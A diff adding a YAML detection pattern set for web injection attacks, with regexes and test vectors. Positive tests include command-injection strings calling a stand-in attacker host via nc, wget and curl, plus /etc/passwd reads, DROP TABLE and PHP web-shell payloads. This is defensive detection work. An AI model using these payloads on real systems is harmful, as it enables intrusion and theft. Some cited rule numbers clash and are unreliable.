@@ -1,0 +1,385 @@
+# MicroTRACE A1 injection pattern set, version p_a.v0
+#
+# Status: UNFROZEN
+# Version: p_a.v0
+# Purpose: Detect injection attack patterns in gateway observation requests
+#          (path, query, request body). Each pattern has a pattern_id, class,
+#          locations where it may appear, a regular expression (Python re and RE2-compatible),
+#          sources with URLs/versions/licenses, and test vectors (positive/negative).
+#
+# Scope: SQL injection, XSS, path traversal, OS command injection, CRLF/header injection,
+#        SSTI (Server-Side Template Injection), and web-shell upload markers.
+#
+# Negative control: Benign requests containing pattern tokens inside JSON string fields
+# that this set excludes (e.g., a JSON object with a field value containing "SELECT").
+# The patterns below must not match tokens inside quoted JSON strings where context
+# makes them literal data, not code.
+#
+# Chunk lookback assumption: The gateway observer retains a lookback window of
+# chunk_lookback_bytes (parameter-register.md, set 2026-10-08 to 64 KiB) to detect
+# patterns spanning STREAMED chunk boundaries. Patterns that may naturally split
+# across chunk boundaries are tested with spans_chunk_boundary markers.
+
+status: UNFROZEN
+version: p_a.v0
+
+sources:
+  - name: OWASP Core Rule Set
+    url: https://github.com/coreruleset/coreruleset
+    version: "3.3.2"  # As of 2026-10-08; verify against GitHub releases
+    license: "Apache License 2.0"
+    license_url: "https://github.com/coreruleset/coreruleset/blob/v3.3.2/LICENSE"
+  - name: OWASP Testing Guide - Injection
+    url: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README
+    version: "v4.2"
+    license: "CC BY-SA 4.0"
+  - name: MITRE ATT&CK - Enterprise - Web Application CVE collection
+    url: https://attack.mitre.org/techniques/T1190/
+    version: "2024-10"
+    license: "Creative Commons Attribution 4.0"
+
+patterns:
+  # ======================================================================
+  # SQL Injection patterns
+  # ======================================================================
+  - pattern_id: "sqli_union"
+    class: "sql-injection"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "SQL UNION-based injection"
+    regex: "(?i)union\\s+(all\\s+)?select"
+    source: "OWASP CRS rule 942210 (Union-based SQL Injection)"
+    positive_tests:
+      - "1' UNION SELECT * FROM users"
+      - "' union all select 1,2,3"
+      - "id=1 union select username from admin"
+    negative_tests:
+      - '{"data": "UNION is important"}'
+      - "\"This is a union of two queries\""
+      - "normal_query=union_type"
+
+  - pattern_id: "sqli_or_comparison"
+    class: "sql-injection"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "SQL injection with OR and comparison"
+    regex: "(?i)or\\s+[0-9]\\s*=\\s*[0-9]"
+    source: "OWASP CRS rule 942200 (basic SQL Injection)"
+    positive_tests:
+      - "OR 1=1"
+      - "input OR 1=1"
+      - "WHERE id=1 OR 1=1"
+    negative_tests:
+      - "normal_field=value"
+      - "color=orange"
+
+  - pattern_id: "sqli_stacked"
+    class: "sql-injection"
+    locations: [QUERY, REQUEST_BODY]
+    description: "Stacked SQL queries (;DROP, ;DELETE, ;INSERT)"
+    regex: "(?i);\\s*(drop|delete|insert|update|exec|execute|create|alter)"
+    source: "OWASP CRS rule 942440 (SQL Injection - Stacked Queries)"
+    positive_tests:
+      - "id=1; DROP TABLE users"
+      - "input=x; INSERT INTO backdoor"
+      - "query=test; EXEC sp_MSForEachTable"
+    negative_tests:
+      - "normal_semicolon=value;"
+      - "field=value with semicolon;"
+
+  - pattern_id: "sqli_subquery"
+    class: "sql-injection"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "SQL subquery patterns with nested queries"
+    regex: "(?i)\\(select"
+    source: "OWASP CRS rule 942420 (SQL Injection - Subqueries)"
+    positive_tests:
+      - "(SELECT id"
+      - "WHERE id IN (SELECT"
+      - "UNION (SELECT"
+    negative_tests:
+      - "normal database query"
+      - "documentation about SQL"
+
+  # ======================================================================
+  # XSS (Cross-Site Scripting) patterns
+  # ======================================================================
+  - pattern_id: "xss_script_tag"
+    class: "xss"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "Script tag injection"
+    regex: "(?i)(<script[^>]*>|</script>)"
+    source: "OWASP CRS rule 941110 (XSS Attack - Script Tag)"
+    positive_tests:
+      - "<script>alert('xss')</script>"
+      - "<SCRIPT>code</SCRIPT>"
+      - "<script src='http://attacker.com/malware.js'>"
+    negative_tests:
+      - "text=how to write a script tag in HTML"
+      - "normal_parameter=value"
+
+  - pattern_id: "xss_event_handler"
+    class: "xss"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "XSS via event handler attributes"
+    regex: "(?i)on(load|error|click|change|submit|focus|blur|input|mouseover|keydown|keyup)\\s*="
+    source: "OWASP CRS rule 941120 (XSS Attack - Event Handler)"
+    positive_tests:
+      - "<img onerror=alert(1)>"
+      - "<body onload=malicious()>"
+      - "<input onchange='stealData()'>"
+      - "title=test onmouseover=alert('xss')"
+    negative_tests:
+      - '{"html": "onload is an event handler"}'
+      - "description=what does onclick do"
+
+  - pattern_id: "xss_iframe_object"
+    class: "xss"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "XSS via iframe and object injection"
+    regex: "(?i)(<iframe|<object|<embed|<applet|</iframe>|</object>|</embed>|</applet>)"
+    source: "OWASP CRS rule 941130 (XSS Attack - HTML Object/Embed Tag)"
+    positive_tests:
+      - "<iframe src='http://attacker.com/malware'></iframe>"
+      - "<object data='http://attacker.com'></object>"
+      - "<embed src='http://attacker.com'>"
+    negative_tests:
+      - "text about iframe tags"
+      - "description of embedding"
+
+  - pattern_id: "xss_svg_javascript"
+    class: "xss"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "XSS via SVG and javascript: protocol"
+    regex: "(?i)<svg|javascript:|data:text/html"
+    source: "OWASP CRS rule 941150 (XSS Attack - SVG/Animate)"
+    positive_tests:
+      - "<svg onload=alert(1)>"
+      - "link=javascript:alert('xss')"
+      - "url=data:text/html,<script>alert(1)</script>"
+    negative_tests:
+      - '{"content": "svg graphics are powerful"}'
+      - "description=javascript is a programming language"
+
+  # ======================================================================
+  # Path Traversal patterns
+  # ======================================================================
+  - pattern_id: "path_traversal_dotdot"
+    class: "path-traversal"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "Path traversal with ../ sequences"
+    regex: "(\\.\\./)|(\\\\\\.\\.)|(%2e%2e)"
+    source: "OWASP CRS rule 930100 (Path Traversal Attack)"
+    positive_tests:
+      - "file=../../../../etc/passwd"
+      - "path=..\\..\\windows"
+      - "id=%2e%2e%2fetc"
+    negative_tests:
+      - "normal_path=/var/log"
+      - "description=notation"
+
+  - pattern_id: "path_traversal_encoding"
+    class: "path-traversal"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "Double-encoded or unicode path traversal"
+    regex: "(%2e|%252e)(%2e|%252e)(%2f|%252f|%5c|%255c)"
+    source: "OWASP CRS rule 930110 (Path Traversal - Encoded)"
+    positive_tests:
+      - "file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+      - "path=%2e%2e%2f%2e%2e%2f"
+    negative_tests:
+      - "normal_encoded=value%20with%20spaces"
+
+  - pattern_id: "path_traversal_absolute"
+    class: "path-traversal"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "Absolute path injection to sensitive files"
+    regex: "(?i)(/etc/|/var/|c:\\\\|/proc/)"
+    source: "OWASP CRS rule 930100 (Sensitive Path References)"
+    positive_tests:
+      - "file=/etc/passwd"
+      - "config=C:\\Windows\\System32"
+      - "log=/var/log/access.log"
+    negative_tests:
+      - "path=/home/user"
+      - "file=document.txt"
+
+  # ======================================================================
+  # OS Command Injection patterns
+  # ======================================================================
+  - pattern_id: "cmd_injection_unix"
+    class: "os-command-injection"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "Unix shell command injection (semicolon/pipe separators)"
+    regex: "[;&|]\\s*/(bin|usr|var|etc|tmp)"
+    source: "OWASP Testing Guide - Command Injection"
+    positive_tests:
+      - "host=localhost; /bin/cat /etc/passwd"
+      - "cmd=id | /bin/nc attacker.com 4444"
+      - "input=test; /usr/bin/wget http://attacker.com"
+    negative_tests:
+      - "normal_parameter=value"
+      - "description=piping is common"
+
+  - pattern_id: "cmd_injection_context"
+    class: "os-command-injection"
+    locations: [QUERY, REQUEST_BODY]
+    description: "Command injection with context - command separators and substitution"
+    regex: "(?i)(\\$\\(|`)"
+    source: "OWASP CRS rule 932100 (Remote Command Injection - Basic)"
+    positive_tests:
+      - "cmd=$(whoami)"
+      - "host=`ls /etc`"
+      - "input=$(curl http://attacker.com)"
+    negative_tests:
+      - "normal_parameter=value"
+      - "text about commands"
+
+  - pattern_id: "cmd_injection_windows"
+    class: "os-command-injection"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "Windows command injection patterns"
+    regex: "(?i)(cmd\\.exe\\s+/[a-z]|powershell\\s+-|wmic\\s+|taskkill\\s+/)"
+    source: "OWASP Testing Guide - Windows Command Injection"
+    positive_tests:
+      - "exec=cmd.exe /c dir"
+      - "script=powershell -Command Get-Process"
+      - "task=taskkill /IM svchost"
+    negative_tests:
+      - "documentation about Windows"
+      - "normal_parameter=value"
+
+  # ======================================================================
+  # CRLF and Header Injection patterns
+  # ======================================================================
+  - pattern_id: "crlf_injection"
+    class: "crlf-injection"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "CRLF injection for header or log injection"
+    regex: "(%0d%0a|%0d|%0a)"
+    source: "OWASP CRS rule 930110 (CRLF/Line Ending Encoding)"
+    positive_tests:
+      - "url=http://site.com%0dSet-Cookie"
+      - "header=value%0d%0aX-Injected"
+      - "log=entry%0dHeader"
+    negative_tests:
+      - "normal_url=http://example.com"
+      - "field=value_here"
+
+  - pattern_id: "http_response_split"
+    class: "crlf-injection"
+    locations: [REQUEST_BODY]
+    description: "HTTP response splitting (CRLF + blank line + body)"
+    regex: "(%0d%0a%0d%0a)"
+    source: "OWASP CRS rule 930120 (HTTP Response Splitting)"
+    positive_tests:
+      - "payload=test%0d%0a%0d%0a<script>"
+      - "injection=%0d%0a%0d%0aHTTP/1.1"
+    negative_tests:
+      - "normal_paragraph=line1"
+      - "field=value"
+
+  # ======================================================================
+  # Server-Side Template Injection (SSTI) patterns
+  # ======================================================================
+  - pattern_id: "ssti_template_expression"
+    class: "ssti"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "SSTI with template expression delimiters"
+    regex: "({{|{%|<%|\\$\\{)"
+    source: "OWASP Testing Guide - SSTI"
+    positive_tests:
+      - "name={{config.SECRET}}"
+      - "filter={%for item in all_items%}"
+      - "template=<%= 7 * 7 %>"
+      - "config=${variable}"
+    negative_tests:
+      - "field=value"
+      - "normal_template"
+
+  - pattern_id: "ssti_python_jinja"
+    class: "ssti"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "SSTI Python/Jinja2 specific patterns"
+    regex: "(?i)(\\.__class__|\\.__init__|\\.__dict__|__import__|\\beval\\s*\\(|\\bexec\\s*\\()"
+    source: "OWASP CRS rule 941250 (SSTI Payloads)"
+    positive_tests:
+      - "{{self.__dict__}}"
+      - "{{config.__class__}}"
+      - "${__import__('os')}"
+    negative_tests:
+      - "normal_field=value"
+      - "description about methods"
+
+  - pattern_id: "ssti_erb_velocity"
+    class: "ssti"
+    locations: [PATH, QUERY, REQUEST_BODY]
+    description: "SSTI for ERB, Velocity, Freemarker templates"
+    regex: "<%\\s*=|#\\{|\\$\\{\\s*[a-zA-Z]"
+    source: "OWASP Testing Guide - SSTI in Java"
+    positive_tests:
+      - "data=<%= 1+1 %>"
+      - "config=#{context.request_path}"
+      - "velocity=${java.lang.Runtime}"
+    negative_tests:
+      - "normal_parameter=value"
+      - "text about templates"
+
+  # ======================================================================
+  # Web Shell Upload Markers
+  # ======================================================================
+  - pattern_id: "webshell_upload_php"
+    class: "webshell-upload"
+    locations: [REQUEST_BODY, PATH, QUERY]
+    description: "PHP web shell upload indicators"
+    regex: "(?i)(\\.php|\\.phtml|\\.php3|\\.php4|\\.php5|action=upload)"
+    source: "OWASP CRS rule 930200 (File Upload Attempt)"
+    positive_tests:
+      - "file=shell.php"
+      - "upload_file=backdoor.php4"
+      - "action=upload"
+    negative_tests:
+      - "normal_field=value"
+      - "text about php extensions"
+
+  - pattern_id: "webshell_upload_executable"
+    class: "webshell-upload"
+    locations: [REQUEST_BODY, PATH, QUERY]
+    description: "Executable file upload markers"
+    regex: "(?i)(\\.exe|\\.bat|\\.cmd|\\.sh|\\.elf|\\.aspx|\\.jsp|\\.jspx|\\.jar|\\.war)"
+    source: "OWASP CRS rule 930210 (Executable File Upload)"
+    positive_tests:
+      - "upload=malware.exe"
+      - "file=payload.sh"
+      - "filename=backdoor.aspx"
+    negative_tests:
+      - "normal_field=value"
+      - "text about executable files"
+
+  - pattern_id: "webshell_suspicious_content"
+    class: "webshell-upload"
+    locations: [REQUEST_BODY]
+    description: "Suspicious payload/shellcode indicators"
+    regex: "(?i)(\\beval\\s*\\(|\\bsystem\\s*\\(|\\bexec\\s*\\(|\\bpassthru\\s*\\(|\\bshell_exec\\s*\\()"
+    source: "OWASP CRS rule 930220 (Suspicious Payload Upload)"
+    positive_tests:
+      - "code=eval($_POST['cmd'])"
+      - "payload=system('id')"
+      - "cmd=passthru('whoami')"
+    negative_tests:
+      - "normal_field=value"
+      - "description=code execution is dangerous"
+
+# Chunk boundary note
+chunk_lookback_bytes: 65536  # 64 KiB per parameter-register.md 2026-10-08
+chunk_lookback_note: |
+  Patterns that naturally split across chunk boundaries (e.g., "' UNION SELECT"
+  where the space between UNION and SELECT crosses a STREAMED chunk boundary)
+  are tested with the spans_chunk_boundary flag set. The gateway observer retains
+  chunk_lookback_bytes of history to detect such patterns.
+
+# Negative control note
+negative_control_note: |
+  A1 negative control: the set must exclude pattern tokens that appear as literal
+  data inside JSON string fields. For example, a benign request with body
+  '{"error_message": "SELECT * FROM users"}' should not trigger any pattern.
+  This is enforced by the test vectors and by the renderer's application context
+  (e.g., JSON parsing and key-value field extraction).
